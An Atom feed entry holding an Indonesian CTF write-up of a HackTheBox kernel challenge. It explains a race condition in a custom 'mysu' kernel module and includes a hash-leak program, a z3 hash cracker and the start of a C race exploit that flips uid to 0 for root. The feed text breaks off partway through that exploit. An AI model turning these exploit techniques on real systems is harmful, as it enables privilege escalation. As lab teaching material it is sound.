<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2024-02-28T15:44:21+07:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Abdullah</title><subtitle>[&quot;Undergraduate Informatics Student at Telkom University. Interested on Software Engineering and Cyber Security related area.&quot;, &quot;I'd like to share my writeup for interested challenges here.&quot;]</subtitle><entry><title type="html">Kernel Adventures Part I: SUID binaries are too vulnerable. So I decided to implement su in the Kernel</title><link href="http://localhost:4000/2022/08/26/kernel-adventures-part-1.html" rel="alternate" type="text/html" title="Kernel Adventures Part I: SUID binaries are too vulnerable. So I decided to implement su in the Kernel" /><published>2022-08-26T15:57:28+07:00</published><updated>2022-08-26T15:57:28+07:00</updated><id>http://localhost:4000/2022/08/26/kernel-adventures-part-1</id><content type="html" xml:base="http://localhost:4000/2022/08/26/kernel-adventures-part-1.html"><![CDATA[<p>Kernel Adventures, merupakan kernel exploitation yang terdapat disalah satu challenge <a href="www.hackthebox.com">hackthebox</a>. Ini merupakan challenge kernel pertama yang aku selesaikan. Challenge ini memiliki kesulitan medium jadi mungkin ini masih tergolong mudah.</p>

<p>Spoiler alert! karena instance dari challenge ini masih aktif.</p>

<h2 id="0x01-overview">0x01 Overview</h2>

<p>Kernel exploitation adalah challenge kernel yang mana kita sebagai user biasa harus mendapatkan privilege escalation dengan mengeksploitasi bug yang terdapat pada kernel module yang diberikan. Berikut attachment yang diberikan:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>release/
├── bzImage
├── notes.txt
├── rootfs.cpio.gz
└── run.sh
</code></pre></div></div>

<p>Penjelasan singkat mengenai file-file diatas:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">bzImage</code> image kernel yang digunakan untuk booting ke sistem operasi. Didalam file ini juga terdapat binary kernel atau biasa disebut <code class="language-plaintext highlighter-rouge">vmlinux</code>.</li>
  <li><code class="language-plaintext highlighter-rouge">rootfs.cpio.gz</code> berisi filesystem image untuk sistem operasi challenge ini.</li>
  <li><code class="language-plaintext highlighter-rouge">run.sh</code> bash script yang digunakan untuk menjalankan sistem operasi.</li>
</ul>

<p>Yang perlu diperhatikan pada kasus ini adalah <code class="language-plaintext highlighter-rouge">rootfs.cpio.gz</code> karena disinilah file kernel module disimpan yang nantinya akan di-insert ke linux kernel menggunakan <code class="language-plaintext highlighter-rouge">insmod</code>.</p>

<h3 id="extracting-linux-image-filesystem">Extracting Linux Image Filesystem</h3>

<p>Ekstraksi filesystem dari image dapat menggunakan perintah <code class="language-plaintext highlighter-rouge">cpio</code> yang ada di-bash.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gunzip rootfs.cpio.gz &amp;&amp; mkdir files
$ cd files/
$ cpio -idmv &lt; ../rootfs.cpio
...
$ ls
bin  etc   home  lib    linuxrc  mnt      opt   root  sbin  tmp  var
dev  flag  init  lib64  media    mysu.ko  proc  run   sys   usr
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">init</code> adalah file yang akan dieksekusi pertama kali setelah proses booting selesai. <code class="language-plaintext highlighter-rouge">mysu.ko</code> ini adalah kernel module yang ditambahkan pada kernel. Untuk membaca <code class="language-plaintext highlighter-rouge">flag</code> diperlukan akses root yang bisa didapatkan dengan meng-eksploitasi kernel module <code class="language-plaintext highlighter-rouge">mysu.ko</code>. Lainnya adalah filesystem biasa yang terdapat pada linux.</p>

<h3 id="kernel-module-structure">Kernel Module Structure</h3>

<p>Pada kernel module terdapat 2 fungsi utama yaitu <code class="language-plaintext highlighter-rouge">&lt;mod_name&gt;_init</code> dan <code class="language-plaintext highlighter-rouge">&lt;mod_name&gt;_exit</code>.</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">&lt;mod_name&gt;_init</code> ini akan dieksekusi ketika module di-load ke kernel.</li>
  <li><code class="language-plaintext highlighter-rouge">&lt;mod_name&gt;_exit</code> ini akan dieksekusi ketika module di-unload dari kernel.</li>
</ul>

<p>Fungsi lain yang digunakan untuk berinteraksi antara kernel dengan user biasanya berawalan dengan <code class="language-plaintext highlighter-rouge">dev_*</code>, sebagai contoh <code class="language-plaintext highlighter-rouge">dev_open</code>, <code class="language-plaintext highlighter-rouge">dev_read</code>, dan <code class="language-plaintext highlighter-rouge">dev_write</code>. Dan ketiganya terdapat pada kernel module <code class="language-plaintext highlighter-rouge">mysu</code>.</p>

<h2 id="0x02-reversing-kernel-module">0x02 Reversing Kernel Module</h2>

<p>Dilihat dari <code class="language-plaintext highlighter-rouge">mysu_init</code>, kernel module akan membuat device pada <code class="language-plaintext highlighter-rouge">/dev/mysu</code> yang nantinya bisa digunakan untuk berinteraksi dengan user.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">hash</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">password</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>
    <span class="n">idx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">password_size</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>
    <span class="k">while</span> <span class="p">(</span> <span class="n">idx</span> <span class="o">!=</span> <span class="n">password_size</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">tmp</span> <span class="o">=</span> <span class="mi">1025</span> <span class="o">*</span> <span class="p">(</span><span class="n">password</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">+</span> <span class="n">res</span><span class="p">);</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">password</span><span class="p">[</span><span class="n">idx</span><span class="o">++</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">^</span> <span class="n">tmp</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Fungsi <code class="language-plaintext highlighter-rouge">hash</code> melakukan kalkulasi per-byte password dengan operasi add, mult, shift, dan xor.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">dev_read</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">user_buf</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">user_copy_size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>
    <span class="n">n</span> <span class="o">=</span> <span class="n">user_copy_size</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">user_copy_size</span> <span class="o">&gt;</span> <span class="mh">0x20</span> <span class="p">)</span>
        <span class="n">n</span> <span class="o">=</span> <span class="mh">0x20</span><span class="p">;</span>
    <span class="n">memcpy</span><span class="p">(</span><span class="n">user_buf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">users</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">n</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Fungsi <code class="language-plaintext highlighter-rouge">dev_read</code> meng-copy <code class="language-plaintext highlighter-rouge">&amp;users</code> ke <code class="language-plaintext highlighter-rouge">user_buf</code> sebanyak <code class="language-plaintext highlighter-rouge">user_copy_size</code> dan panjang request copy tidak bisa lebih dari 32. <code class="language-plaintext highlighter-rouge">&amp;users</code> ini berisi <code class="language-plaintext highlighter-rouge">uid</code> dan <code class="language-plaintext highlighter-rouge">hash</code> dari users dan admin.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">dev_write</span><span class="p">(</span><span class="n">__int64</span> <span class="n">a1</span><span class="p">,</span> <span class="n">req_s</span> <span class="o">*</span><span class="n">req</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="n">__int64</span> <span class="n">user_write_size</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">user_write_size</span> <span class="o">&lt;=</span> <span class="mi">7</span> <span class="p">)</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="o">==</span> <span class="n">users</span><span class="p">.</span><span class="n">uid</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">password</span> <span class="o">=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">hash</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">)</span> <span class="o">==</span> <span class="n">users</span><span class="p">.</span><span class="n">hash</span> <span class="p">)</span>
            <span class="k">goto</span> <span class="n">SUCCESS</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">admin</span><span class="p">.</span><span class="n">uid</span> <span class="o">!=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="p">)</span>
            <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">admin</span><span class="p">.</span><span class="n">uid</span> <span class="o">!=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">password</span> <span class="o">=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">;</span>

    <span class="k">if</span> <span class="p">(</span> <span class="n">hash</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">)</span> <span class="o">!=</span> <span class="n">admin</span><span class="p">.</span><span class="n">hash</span> <span class="p">)</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="nl">SUCCESS:</span>
    <span class="n">uid</span> <span class="o">=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">uid</span><span class="p">;</span>
    <span class="n">ptr</span> <span class="o">=</span> <span class="n">prepare_creds</span><span class="p">(</span><span class="n">password</span><span class="p">);</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span>  <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span>  <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">12</span><span class="p">)</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">16</span><span class="p">)</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">20</span><span class="p">)</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">24</span><span class="p">)</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">28</span><span class="p">)</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">+</span> <span class="mi">32</span><span class="p">)</span> <span class="o">=</span> <span class="n">uid</span><span class="p">;</span>
    <span class="n">commit_creds</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">user_copy_size</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Fungsi <code class="language-plaintext highlighter-rouge">dev_write</code> melakukan perbandingan <code class="language-plaintext highlighter-rouge">req-&gt;uid</code> dan <code class="language-plaintext highlighter-rouge">req-&gt;password</code>’s hash, apakah request user merupakan <code class="language-plaintext highlighter-rouge">users</code> (uid: 1000) atau <code class="language-plaintext highlighter-rouge">admin</code> (uid: 1001). Jika semua pengecekan dapat lolos, maka kernel akan memanggil <code class="language-plaintext highlighter-rouge">commit_creds</code> dengan <code class="language-plaintext highlighter-rouge">cred-&gt;uid = req-&gt;uid</code>.</p>

<p>Jika dilihat pada program, kita tidak bisa mengirim request dengan uid 0. Karena pengecekan hanya mengecek apakah user merupakan <code class="language-plaintext highlighter-rouge">users</code> atau <code class="language-plaintext highlighter-rouge">admin</code>. Jika tidak keduanya maka return null.</p>

<h3 id="bug">Bug</h3>

<p>Jika dilihat pada <code class="language-plaintext highlighter-rouge">dev_write</code> setelah seluruh pengecekan selesai, <code class="language-plaintext highlighter-rouge">user-&gt;uid</code> akan di-fetch ke variable lokal <code class="language-plaintext highlighter-rouge">uid</code> dan akan digunakan untuk meng-assign value uid, gid, dll. dari <code class="language-plaintext highlighter-rouge">struct cred</code> sebagai argument untuk memanggil <code class="language-plaintext highlighter-rouge">commit_creds</code>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="o">==</span> <span class="n">users</span><span class="p">.</span><span class="n">uid</span> <span class="p">)</span>
<span class="p">{</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">hash</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">)</span> <span class="o">==</span> <span class="n">users</span><span class="p">.</span><span class="n">hash</span> <span class="p">)</span>
        <span class="k">goto</span> <span class="n">SUCCESS</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">admin</span><span class="p">.</span><span class="n">uid</span> <span class="o">!=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="p">)</span>
        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">admin</span><span class="p">.</span><span class="n">uid</span> <span class="o">!=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">uid</span> <span class="p">)</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>

<span class="n">password</span> <span class="o">=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">;</span>
<span class="k">if</span> <span class="p">(</span> <span class="n">hash</span><span class="p">(</span><span class="n">req</span><span class="o">-&gt;</span><span class="n">password</span><span class="p">)</span> <span class="o">!=</span> <span class="n">admin</span><span class="p">.</span><span class="n">hash</span> <span class="p">)</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>

<span class="n">SUCCESS</span><span class="o">:</span>
<span class="n">uid</span> <span class="o">=</span> <span class="n">req</span><span class="o">-&gt;</span><span class="n">uid</span><span class="p">;</span> <span class="c1">// fetch</span>
</code></pre></div></div>

<p>Bagaimana jika setelah pengecekan user yang valid selesai, lalu kita mengubah nilai dari <code class="language-plaintext highlighter-rouge">req-&gt;uid</code> tadi pada thread lain? Ini akan menimbulkan inconsistency yang bisa kita manfaatkan untuk mendapatkan <code class="language-plaintext highlighter-rouge">root</code>.</p>

<h2 id="0x03-exploitation">0x03 Exploitation</h2>

<p>Jika dilihat dari notes.txt,</p>

<blockquote>
  <p>“I removed the password hashes in the file I gave you. They’re not supposed to be 0.”</p>
</blockquote>

<p>Author telah menghapus password hash user valid yang terdapat pada <code class="language-plaintext highlighter-rouge">mysu.ko</code> yang diberikan tadi. Maka diperlukan read terlebih dahulu di-server.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define MAX_SIZE 4
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">buf</span><span class="p">[</span><span class="n">MAX_SIZE</span><span class="p">];</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">DEVICE_PATH</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"%s: failed open the device.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">argv</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">));</span>

    <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_SIZE</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">printf</span><span class="p">(</span><span class="s">"[%02x]: %08x (%d)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Jalankan pada server akan didapatkan <code class="language-plaintext highlighter-rouge">uid</code> dan <code class="language-plaintext highlighter-rouge">hash</code> password dari <code class="language-plaintext highlighter-rouge">users</code> dan <code class="language-plaintext highlighter-rouge">admin</code> yang valid.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/ <span class="nv">$ </span>/tmp/hax
<span class="o">[</span>00]: 000003e8 <span class="o">(</span>1000<span class="o">)</span>
<span class="o">[</span>01]: 03319f75 <span class="o">(</span>53583733<span class="o">)</span>
<span class="o">[</span>02]: 000003e9 <span class="o">(</span>1001<span class="o">)</span>
<span class="o">[</span>03]: 2ab76467 <span class="o">(</span>716661863<span class="o">)</span>
</code></pre></div></div>

<h3 id="cracking-hash-password">Cracking Hash Password</h3>

<p>Tidak tau kenapa, z3 tidak menyelesaikannya secara optimal, sehingga dibutuhkan double check terhadap password yang didapatkan.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">z3</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">max_uint</span> <span class="o">=</span> <span class="mh">0xFFFFFFFF</span>
<span class="n">max_int</span>  <span class="o">=</span> <span class="mh">0x80000000</span>

<span class="k">def</span> <span class="nf">hash</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
        <span class="n">tmp</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1025</span> <span class="o">*</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">+</span> <span class="n">res</span><span class="p">))</span> <span class="o">&amp;</span> <span class="n">max_uint</span>
        <span class="n">res</span> <span class="o">=</span> <span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">&gt;&gt;</span> <span class="mi">6</span><span class="p">)</span> <span class="o">^</span> <span class="n">tmp</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">max_uint</span>
        <span class="n">res</span> <span class="o">=</span> <span class="n">res</span> <span class="o">|</span> <span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="n">res</span> <span class="o">&amp;</span> <span class="n">max_int</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">res</span>

<span class="n">target</span> <span class="o">=</span> <span class="mh">0x03319f75</span> <span class="c1"># users
</span><span class="n">target</span> <span class="o">=</span> <span class="mh">0x2ab76467</span> <span class="c1"># admin
</span><span class="n">length</span> <span class="o">=</span> <span class="mi">8</span>          <span class="c1"># increase if there is no solution by z3.
</span>
<span class="n">s</span> <span class="o">=</span> <span class="nc">Solver</span><span class="p">()</span>
<span class="n">b</span> <span class="o">=</span> <span class="p">[</span><span class="nc">BitVec</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">b!</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="n">length</span><span class="p">)]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">b</span><span class="p">)):</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="nc">And</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mh">0x20</span><span class="p">,</span> <span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&lt;</span> <span class="mh">0x7f</span><span class="p">))</span>

<span class="n">s</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span><span class="nf">hash</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">==</span> <span class="n">target</span><span class="p">)</span>

<span class="k">while</span> <span class="n">s</span><span class="p">.</span><span class="nf">check</span><span class="p">()</span> <span class="o">==</span> <span class="n">sat</span><span class="p">:</span>
    <span class="n">m</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">model</span><span class="p">()</span>
    <span class="n">p</span> <span class="o">=</span> <span class="nf">bytes</span><span class="p">([</span><span class="n">m</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="nf">as_long</span><span class="p">()</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">b</span><span class="p">])</span>

    <span class="n">s</span><span class="p">.</span><span class="nf">add</span><span class="p">(</span>
        <span class="nc">Or</span><span class="p">(</span>
            <span class="n">b</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="n">p</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
            <span class="n">b</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="n">p</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span>
            <span class="n">b</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">!=</span> <span class="n">p</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span>
            <span class="n">b</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">!=</span> <span class="n">p</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span>
            <span class="n">b</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">!=</span> <span class="n">p</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span>
        <span class="p">)</span>
    <span class="p">)</span>

    <span class="k">if</span> <span class="nf">hash</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">==</span> <span class="n">target</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">[valid] (</span><span class="si">{</span><span class="n">p</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span><span class="si">}</span><span class="s">) -&gt; </span><span class="si">{</span><span class="n">p</span><span class="si">}</span><span class="se">\n</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="attack-ideas">Attack Ideas</h3>

<p>Kita dapat mengubah <code class="language-plaintext highlighter-rouge">req-&gt;uid</code> di-thread lain. Sehingga pada saat pengecekan <code class="language-plaintext highlighter-rouge">req-&gt;uid</code> yang awalnya merupakan uid user biasa dan pengecekan hash password selesai, nilai <code class="language-plaintext highlighter-rouge">req-&gt;uid</code> akan kita ubah menjadi uid root yang nantinya ini akan di-fetch ke variable lokal uid dan digunakan untuk assign <code class="language-plaintext highlighter-rouge">cred</code> struct untuk <code class="language-plaintext highlighter-rouge">commit_creds</code>. Sebagai gambaran alur prosesnya.</p>

<table>
  <thead>
    <tr>
      <th>Other Thread</th>
      <th>Main Thread</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>…</td>
      <td><code class="language-plaintext highlighter-rouge">req-&gt;uid</code> user valid check</td>
    </tr>
    <tr>
      <td>…</td>
      <td><code class="language-plaintext highlighter-rouge">req-&gt;password</code> hash valid check</td>
    </tr>
    <tr>
      <td>set <code class="language-plaintext highlighter-rouge">req-&gt;uid</code> into 0 (root uid)</td>
      <td>uid = <code class="language-plaintext highlighter-rouge">req-&gt;uid</code></td>
    </tr>
    <tr>
      <td>…</td>
      <td>cred-&gt;uid = 0 and others</td>
    </tr>
    <tr>
      <td>…</td>
      <td>commit_creds(cred) will give us root</td>
    </tr>
  </tbody>
</table>

<p>Untuk mengoptimalkan exploit dapat dilakukan race condition untuk mengubah user uid ke root uid, dan break jika sudah mendapatkan root privileged.</p>

<p>Full exploit,</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
</span>
<span class="cp">#define _GNU_SOURCE
#define DEVICE_PATH     "/dev/mysu"
#define USER_UID        1000
#define ADMIN_UID       1001
#define USER_PASSWORD   "UeS6Lsp("
#define ADMIN_PASSWORD  "pYH4f5Rb"
</span>
<span class="k">struct</span> <span class="n">req_cred_s</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">uid</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">28</span><span class="p">];</span>
<span class="p">}</span> <span class="n">req</span><span class="p">;</span>

<span class="kt">void</span> <span class="o">*</span><span class="nf">race_thread</span><span class="p">()</span> <span class="p">{</span>
    <span class="k">for</span> <span class="p">(;;)</span> <span class="n">req</span><span class="p">.</span><span class="n">uid</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="o">*</span><span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="n">pthread_t</span> <span class="n">t_id</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">DEVICE_PATH</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"failed open the device.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="n">EXIT_FAILURE</span><span class="p">);</span>
    <span class="p">}</span>

